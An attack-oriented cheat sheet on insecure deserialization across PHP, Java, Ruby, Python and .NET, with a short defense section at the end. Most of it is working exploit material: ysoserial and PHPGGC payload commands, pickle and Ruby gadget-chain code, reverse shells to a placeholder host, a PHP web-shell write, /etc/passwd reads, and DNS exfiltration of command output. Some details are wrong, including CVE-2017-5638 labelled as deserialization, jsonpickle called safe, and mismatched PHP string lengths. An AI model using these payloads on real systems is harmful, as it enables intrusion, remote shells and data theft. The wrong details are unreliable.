# Insecure Deserialization - Cheat Sheet

## Complete Attack Reference

Quick reference for exploiting insecure deserialization vulnerabilities across multiple languages and frameworks.

---

## Table of Contents

1. [Detection & Identification](#detection--identification)
2. [PHP Deserialization](#php-deserialization)
3. [Java Deserialization](#java-deserialization)
4. [Ruby Deserialization](#ruby-deserialization)
5. [Python Deserialization](#python-deserialization)
6. [.NET Deserialization](#net-deserialization)
7. [Exploitation Tools](#exploitation-tools)
8. [Defense & Prevention](#defense--prevention)

---

## Detection & Identification

### Serialization Format Signatures

| Language | Magic Bytes | Base64 Prefix | Pattern |
|----------|-------------|---------------|---------|
| **PHP** | N/A | `Tzo`, `Tz`, `YTo` | `O:4:"User":2:{...}` |
| **Java** | `AC ED 00 05` | `rO0` | Binary format |
| **Ruby** | `04 08` | `BAh` | Binary Marshal format |
| **.NET** | `00 01 00 00` | `AAEAAA` | Binary formatter |
| **Python** | `80 03`, `80 04` | `gAN`, `gAR` | Pickle protocol 3/4 |
| **Node.js** | N/A | Various | `{"type":"Buffer","data":[...]}` |

### Quick Detection Commands

```bash
# Decode and inspect
echo "COOKIE_VALUE" | base64 -d | xxd | head

# Check magic bytes
echo "COOKIE_VALUE" | base64 -d | hexdump -C | head -n 1

# Search for patterns
echo "COOKIE_VALUE" | base64 -d | strings | grep -E "(O:|rO0|BAh)"
```

### Burp Suite Detection

```
1. Proxy → Inspect response
2. Inspector → Expand cookie
3. Look for:
   - "Serialized PHP Object"
   - "Java Serialized Object"
   - Base64 patterns
```

---

## PHP Deserialization

### PHP Serialization Format

```php
// Data types
b:1;                    // boolean true
b:0;                    // boolean false
i:42;                   // integer 42
d:3.14;                 // double/float 3.14
s:5:"hello";            // string "hello" (length 5)
a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}  // array ["foo", "bar"]
N;                      // NULL

// Objects
O:4:"User":2:{          // Object of class "User" with 2 properties
  s:4:"name";           // Property "name"
  s:5:"admin";          // Value "admin"
  s:5:"admin";          // Property "admin"
  b:1;                  // Value true
}

// Private properties (includes null bytes)
O:4:"Test":1:{
  s:10:"\x00Test\x00foo";  // Private property "foo" in class "Test"
  s:3:"bar";
}
```

### Magic Methods (Exploitation Entry Points)

| Method | When Called | Exploitation Potential |
|--------|-------------|------------------------|
| `__construct()` | Object creation | Low - not called during unserialize() |
| `__destruct()` | Object destruction | ⭐⭐⭐ High - Always called |
| `__wakeup()` | After unserialize() | ⭐⭐⭐ High - Called immediately |
| `__toString()` | Object used as string | ⭐⭐ Medium - Requires output |
| `__call()` | Call to undefined method | ⭐⭐ Medium - Requires method call |
| `__callStatic()` | Static call to undefined method | ⭐⭐ Medium - Requires static call |
| `__get()` | Access undefined property | ⭐⭐⭐ High - Common in gadget chains |
| `__set()` | Set undefined property | ⭐ Low - Less common |
| `__isset()` | isset() on undefined property | ⭐ Low - Rare |
| `__unset()` | unset() on undefined property | ⭐ Low - Rare |
| `__sleep()` | Before serialize() | ⭐ Low - Not during deserialization |
| `__invoke()` | Object called as function | ⭐⭐ Medium - Interesting for chains |

### Common PHP Exploits

**Basic Privilege Escalation:**
```php
// Original
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}

// Exploited (change b:0 to b:1)
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

**Type Juggling (Loose Comparison):**
```php
// Exploit PHP's == operator
// Change string to integer 0
s:32:"abc123..." → i:0

// Result: 0 == "any_string" evaluates to true
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

**Arbitrary Object Injection:**
```php
// Inject malicious class
O:14:"CustomTemplate":1:{
  s:14:"lock_file_path";
  s:23:"/home/carlos/morale.txt";
}

// When __destruct() is called:
// unlink($this->lock_file_path);  → deletes file
```

**Property-Oriented Programming (POP) Chain:**
```php
// Chain multiple objects together
O:5:"Start":1:{
  s:4:"next";
  O:6:"Middle":1:{
    s:4:"data";
    O:3:"End":1:{
      s:7:"command";
      s:6:"whoami";
    }
  }
}
```

### PHP Dangerous Functions

```php
// Command execution
exec($cmd)
system($cmd)
passthru($cmd)
shell_exec($cmd)
popen($cmd, 'r')
proc_open($cmd, ...)
`$cmd`  // Backticks

// Code execution
eval($code)
assert($code)  // PHP 5.x
create_function('', $code)  // PHP 5.x
preg_replace('/.*/e', $code, '')  // /e modifier (deprecated)

// File operations
unlink($path)
file_get_contents($path)
file_put_contents($path, $data)
include($path)
require($path)
fopen($path, 'w')

// Reflection
call_user_func($func, $param)
call_user_func_array($func, $params)
ReflectionClass::newInstance()
```

### PHPGGC Usage

```bash
# List all gadget chains
./phpggc -l

# List for specific framework
./phpggc -l symfony
./phpggc -l laravel
./phpggc -l monolog

# Get information about a chain
./phpggc -i Symfony/RCE4

# Generate payload
./phpggc Symfony/RCE4 exec 'rm /tmp/file'

# Generate with encoding
./phpggc Symfony/RCE4 exec 'whoami' -b   # Base64
./phpggc Symfony/RCE4 exec 'whoami' -u   # URL-encode
./phpggc Symfony/RCE4 exec 'whoami' -j   # JSON
./phpggc Symfony/RCE4 exec 'whoami' -s   # Soft URL-encode

# Test payload
./phpggc Symfony/RCE4 exec 'whoami' --test-payload

# Fast destruct (immediate execution)
./phpggc Symfony/RCE4 exec 'whoami' -f

# Generate PHAR file
./phpggc Symfony/RCE4 exec 'whoami' -p phar -o exploit.phar
```

### PHP Framework-Specific Chains

| Framework | PHPGGC Gadget | Notes |
|-----------|---------------|-------|
| Symfony 2.x-5.x | `Symfony/RCE4` | Uses ChainedTransformer |
| Symfony 3.4+ | `Symfony/RCE7` | Alternative chain |
| Laravel 5.4-5.8 | `Laravel/RCE1` | Uses __destruct() |
| Laravel 5.8+ | `Laravel/RCE9` | Updated chain |
| Monolog 1.x-2.x | `Monolog/RCE1` | File write + include |
| Guzzle 6.x | `Guzzle/RCE1` | HTTP request gadget |
| SwiftMailer 5.x-6.x | `SwiftMailer/FW1` | File write |
| Doctrine | `Doctrine/FW1` | File write chain |
| Slim 3.x | `Slim/RCE1` | Uses middleware |

---

## Java Deserialization

### Java Serialization Format

```
Header: AC ED 00 05  (magic bytes + version)

Object format:
0xAC ED          - STREAM_MAGIC
0x00 05          - STREAM_VERSION
0x73             - TC_OBJECT
0x72             - TC_CLASSDESC
...
```

### Detecting Java Serialization

```bash
# Check magic bytes
echo "rO0ABXNy..." | base64 -d | xxd | head
# Output: aced 0005 = Java serialization

# Using Python
python3 -c "import base64; print(base64.b64decode('rO0ABXNy...').hex()[:8])"
# Output: aced0005
```

### ysoserial Usage

```bash
# List all payloads
java -jar ysoserial-all.jar

# Common payloads
CommonsCollections1-7   # Apache Commons Collections
CommonsBeanutils1       # Apache Commons Beanutils
Groovy1                 # Groovy
Spring1-2               # Spring Framework
C3P0                    # C3P0 database pool
Jdk7u21                 # JRE <= 1.7u21
Hibernate1-2            # Hibernate ORM

# Generate payload (Java 16+)
java -jar ysoserial-all.jar \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  CommonsCollections4 'rm /tmp/file' | base64

# Generate payload (Java <= 15)
java -jar ysoserial-all.jar CommonsCollections4 'whoami' | base64

# Generate for JNDI injection
java -jar ysoserial-all.jar JRMPClient "attacker.com:1099" | base64

# Using with Burp Collaborator
java -jar ysoserial-all.jar URLDNS "http://burpcollaborator.net" | base64
```

### Common Java Gadget Chains

**CommonsCollections4 (Most Common):**
```
PriorityQueue.readObject()
  → ChainedTransformer.transform()
    → ConstantTransformer.transform()
      → InvokerTransformer.transform()
        → Runtime.getRuntime().exec(cmd)
```

**CommonsCollections6:**
```
HashSet.readObject()
  → HashMap.put()
    → TiedMapEntry.hashCode()
      → LazyMap.get()
        → ChainedTransformer.transform()
          → Runtime.exec()
```

**Spring1:**
```
SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
  → AnnotationInvocationHandler.invoke()
    → JdkDynamicAopProxy.invoke()
      → ReflectiveMethodInvocation.proceed()
        → Runtime.exec()
```

### Java Deserialization Vulnerable Libraries

| Library | Versions | ysoserial Payload |
|---------|----------|-------------------|
| Apache Commons Collections | 3.x, 4.0-4.0 | CommonsCollections 1-7 |
| Spring Framework | 4.x, 5.x | Spring1, Spring2 |
| Groovy | 1.7-2.4 | Groovy1 |
| Apache Commons Beanutils | 1.9.x | CommonsBeanutils1 |
| C3P0 | 0.9.5 | C3P0 |
| Hibernate | 4.x, 5.x | Hibernate1, Hibernate2 |
| ROME | 1.0 | ROME |
| Vaadin | 7.7.x | Vaadin1 |

### Custom Java Exploitation

**Basic RCE object:**
```java
import java.io.*;

public class Exploit implements Serializable {
    private void readObject(ObjectInputStream in) throws Exception {
        in.defaultReadObject();
        Runtime.getRuntime().exec("rm /tmp/file");
    }
}
```

**Serialize object:**
```java
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(new Exploit());
oos.close();

String encoded = Base64.getEncoder().encodeToString(baos.toByteArray());
System.out.println(encoded);
```

---

## Ruby Deserialization

### Ruby Marshal Format

```
Header: 04 08  (version 4.8)

Common prefixes (Base64):
BAh - Most common
BAFF - Also common
BAFB - Alternative
```

### Detecting Ruby Marshal

```bash
# Check magic bytes
echo "BAhvOh..." | base64 -d | xxd | head
# Output: 0408 = Ruby Marshal

# Identify Rails
# Look for cookies like: _session_id, _csrf_token
```

### Universal Ruby Gadget Chain (2.x-3.x)

```ruby
#!/usr/bin/env ruby
require 'base64'

# Create malicious gem specification
stub_spec = Gem::StubSpecification.new
stub_spec.instance_variable_set(:@loaded_from, "|rm /tmp/file")

# Create installer set
installer_set = Gem::Resolver::InstallerSet.new(:both)
installer_set.instance_variable_set(:@always_install, [stub_spec])

# Create request set (entry point)
request_set = Gem::RequestSet.new
request_set.instance_variable_set(:@sets, [installer_set])

# Serialize and encode
payload = Marshal.dump(request_set)
encoded = Base64.strict_encode64(payload)

puts encoded
```

### Ruby Gadget Chain Components

**Exploitation flow:**
```ruby
Marshal.load(payload)
  → Gem::RequestSet#install
    → Gem::Resolver::InstallerSet#install
      → Gem::StubSpecification#full_name
        → Kernel#load("|command")  # Pipe triggers system execution
```

### Ruby Dangerous Methods

```ruby
# Code execution
eval(code)
instance_eval(code)
class_eval(code)
module_eval(code)

# Command execution
system(cmd)
exec(cmd)
`cmd`  # Backticks
%x(cmd)
open("|cmd")
IO.popen(cmd)
Kernel.load("|cmd")  # With pipe prefix

# Deserialization
Marshal.load(data)
Marshal.restore(data)
YAML.load(data)  # Also dangerous
```

### Rails-Specific Exploits

**Encrypted cookie exploitation:**
```ruby
# If you have the secret_key_base, you can:
# 1. Decrypt the cookie
# 2. Deserialize it
# 3. Modify the object
# 4. Re-serialize
# 5. Re-encrypt
# 6. Sign it

# Rails uses:
ActiveSupport::MessageEncryptor
ActiveSupport::MessageVerifier
```

---

## Python Deserialization

### Python Pickle Format

```
Protocol 0: Text-based (legacy)
Protocol 1: Binary (old)
Protocol 2: Binary (Python 2.3+)
Protocol 3: Binary (Python 3.0+) - gAN
Protocol 4: Binary (Python 3.4+) - gAR
Protocol 5: Binary (Python 3.8+)
```

### Detecting Python Pickle

```bash
# Check magic bytes
echo "gANjcG..." | base64 -d | xxd | head
# Output: 80 03 = Protocol 3

# Protocol 4
echo "gARjcG..." | base64 -d | xxd | head
# Output: 80 04 = Protocol 4
```

### Python Pickle Exploitation

**Basic RCE:**
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm /tmp/file',))

payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

**Advanced RCE (subprocess):**
```python
import pickle
import base64
import subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.Popen, (('rm', '/tmp/file'),))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

**Reverse shell:**
```python
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import socket, subprocess, os
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.10.10", 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        return (subprocess.call, (["/bin/sh", "-i"],))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

---

## .NET Deserialization

### .NET Serialization Formats

```
BinaryFormatter    - Most dangerous
NetDataContractSerializer
SoapFormatter
XmlSerializer      - Less dangerous
DataContractSerializer
```

### Detecting .NET Serialization

```bash
# Check magic bytes for BinaryFormatter
echo "AAEAAAD..." | base64 -d | xxd | head
# Output: 00 01 00 00 = BinaryFormatter
```

### ysoserial.net Usage

```powershell
# List formatters
ysoserial.exe -h

# Generate payload
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"

# Common gadgets
TypeConfuseDelegate
ObjectDataProvider
PSObject
WindowsIdentity

# With different formatters
ysoserial.exe -f SoapFormatter -g TypeConfuseDelegate -c "cmd /c whoami"
ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "powershell -c calc"
```

---

## Exploitation Tools

### Essential Tools

**ysoserial (Java):**
```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
java -jar ysoserial-all.jar
```

**PHPGGC (PHP):**
```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
./phpggc -l
```

**ysoserial.net (.NET):**
```powershell
https://github.com/pwntester/ysoserial.net/releases
```

**Burp Extensions:**
- Java Deserialization Scanner
- Freddy (Deserialization Bug Finder)
- .NET Beautifier and Minifier

### Testing Scripts

**PHP Test:**
```php
<?php
$payload = base64_decode("PAYLOAD_HERE");
$obj = unserialize($payload);
echo "Success\n";
?>
```

**Java Test:**
```java
import java.io.*;
import java.util.Base64;

public class Test {
    public static void main(String[] args) throws Exception {
        byte[] data = Base64.getDecoder().decode(args[0]);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object obj = ois.readObject();
        System.out.println("Success");
    }
}
```

**Ruby Test:**
```ruby
require 'base64'
payload = Base64.decode64(ARGV[0])
obj = Marshal.load(payload)
puts "Success"
```

**Python Test:**
```python
import pickle
import base64
import sys

payload = base64.b64decode(sys.argv[1])
obj = pickle.loads(payload)
print("Success")
```

---

## Defense & Prevention

### Input Validation

```php
// PHP: Use allowed_classes
$obj = unserialize($data, ['allowed_classes' => ['User', 'Session']]);

// PHP: Validate before deserializing
if (preg_match('/[^a-zA-Z0-9:{}";]/', $data)) {
    die("Invalid serialized data");
}
```

```java
// Java: Use ObjectInputFilter (Java 9+)
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(info -> {
    if (info.serialClass() != null) {
        String className = info.serialClass().getName();
        if (className.startsWith("com.myapp.safe.")) {
            return ObjectInputFilter.Status.ALLOWED;
        }
    }
    return ObjectInputFilter.Status.REJECTED;
});
```

### Safer Alternatives

**Instead of native serialization, use:**

```
JSON                    - json_encode/decode, JSON.stringify/parse
MessagePack             - Efficient binary format
Protocol Buffers        - Google's data format
Apache Avro            - Data serialization system
Thrift                 - Cross-language services
```

**Example migrations:**

```php
// Bad: Native PHP serialization
$data = serialize($user);
$user = unserialize($data);

// Good: JSON
$data = json_encode($user, JSON_THROW_ON_ERROR);
$user = json_decode($data, true, 512, JSON_THROW_ON_ERROR);
```

```java
// Bad: ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();

// Good: Jackson JSON
ObjectMapper mapper = new ObjectMapper();
User user = mapper.readValue(jsonString, User.class);
```

### Framework-Specific Protections

**PHP:**
```php
// Disable Phar deserialization
stream_wrapper_unregister('phar');

// Set allowed classes
ini_set('unserialize_callback_func', 'safe_unserialize_callback');
```

**Java:**
```java
// Use Look-Ahead Deserialization
ValidatingObjectInputStream vois = new ValidatingObjectInputStream(input);
vois.accept(User.class, Session.class);
Object obj = vois.readObject();

// Use Apache Commons IO SafeDeserializationUtils
```

**Ruby:**
```ruby
# Use safer alternatives
require 'json'
JSON.parse(data)

# Or MessagePack
require 'msgpack'
MessagePack.unpack(data)

# Never use Marshal.load on untrusted data
```

**Python:**
```python
# Use JSON instead of pickle
import json
obj = json.loads(data)

# Or use safer pickle alternatives
import jsonpickle  # Safer pickle replacement
```

### Signing and Encryption

**HMAC Signing (PHP):**
```php
$secret = 'random_secret_key';
$data = serialize($object);
$signature = hash_hmac('sha256', $data, $secret);
$cookie = base64_encode($data) . '.' . $signature;

// Verification
list($encoded, $signature) = explode('.', $cookie);
$data = base64_decode($encoded);
$expected = hash_hmac('sha256', $data, $secret);
if (!hash_equals($expected, $signature)) {
    die("Tampered data");
}
```

**JWT Instead of Serialization:**
```php
// Use JWT for session tokens
use Firebase\JWT\JWT;

$token = JWT::encode($payload, $secret, 'HS256');
$decoded = JWT::decode($token, $secret, ['HS256']);
```

---

## Payloads Library

### Reverse Shells

**PHP:**
```php
O:6:"Exploit":1:{s:3:"cmd";s:100:"bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'";}
```

**Java (using ysoserial):**
```bash
java -jar ysoserial-all.jar CommonsCollections4 'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}' | base64
```

**Ruby:**
```ruby
stub_spec.instance_variable_set(:@loaded_from, "|ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"10.10.10.10\",4444);loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"error: #{$!}\"}'")
```

### File Operations

**PHP File Read:**
```php
O:6:"FileOp":1:{s:4:"file";s:13:"/etc/passwd";}
// With __toString() calling file_get_contents()
```

**PHP File Write:**
```php
O:6:"FileOp":2:{s:4:"path";s:15:"/tmp/shell.php";s:4:"data";s:18:"<?php system($_GET['c']); ?>";}
// With __destruct() calling file_put_contents()
```

**PHP File Delete:**
```php
O:6:"FileOp":1:{s:4:"path";s:15:"/tmp/target.txt";}
// With __destruct() calling unlink()
```

### Information Disclosure

**Java - DNS Exfiltration:**
```bash
java -jar ysoserial-all.jar URLDNS "http://`whoami`.burpcollaborator.net" | base64
```

**PHP - Error-Based Disclosure:**
```php
O:9:"ErrorTest":1:{s:4:"data";s:100:"<?php echo file_get_contents('/etc/passwd'); ?>";}
```

---

## Lab-Specific Payloads

### PortSwigger Lab Payloads

**Lab 1 - PHP Boolean Flip:**
```bash
echo -n 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}' | base64
```

**Lab 2 - PHP Type Juggling:**
```bash
echo -n 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}' | base64
```

**Lab 4 - PHP Object Injection:**
```bash
echo -n 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}' | base64
```

**Lab 5 - Java CommonsCollections:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

**Lab 6 - PHP Symfony RCE:**
```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
# Then sign with HMAC-SHA1
```

**Lab 7 - Ruby Rails:**
```ruby
stub_spec = Gem::StubSpecification.new
stub_spec.instance_variable_set(:@loaded_from, "|rm /home/carlos/morale.txt")
# ... (full chain from quickstart guide)
```

---

## Quick Reference Commands

### Decoding
```bash
base64 -d <<< "PAYLOAD"
echo "PAYLOAD" | base64 -d
python3 -c "import base64; print(base64.b64decode('PAYLOAD'))"
```

### Encoding
```bash
base64 -w 0 <<< "PAYLOAD"
echo -n "PAYLOAD" | base64
python3 -c "import base64; print(base64.b64encode(b'PAYLOAD').decode())"
```

### URL Encoding
```bash
echo "PAYLOAD" | jq -sRr @uri
python3 -c "import urllib.parse; print(urllib.parse.quote('PAYLOAD'))"
```

### Hex Dump
```bash
xxd payload.bin
hexdump -C payload.bin
od -A x -t x1z payload.bin
```

---

## CVE References

### High-Profile Vulnerabilities

| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2015-4852 | Oracle WebLogic deserialization | Critical RCE |
| CVE-2017-5638 | Apache Struts 2 deserialization | Critical RCE (Equifax breach) |
| CVE-2015-8562 | Joomla PHP object injection | Critical RCE |
| CVE-2019-18889 | Symfony secret token exposure | High - RCE |
| CVE-2020-2555 | Oracle Coherence deserialization | Critical RCE |
| CVE-2021-21345 | XStream deserialization | Critical RCE |
| CVE-2013-0156 | Ruby on Rails YAML deserialization | Critical RCE |
| CVE-2019-16759 | vBulletin unserialize() | Critical RCE |

---

*Keep this cheat sheet handy for quick reference during penetration testing engagements involving deserialization vulnerabilities.*
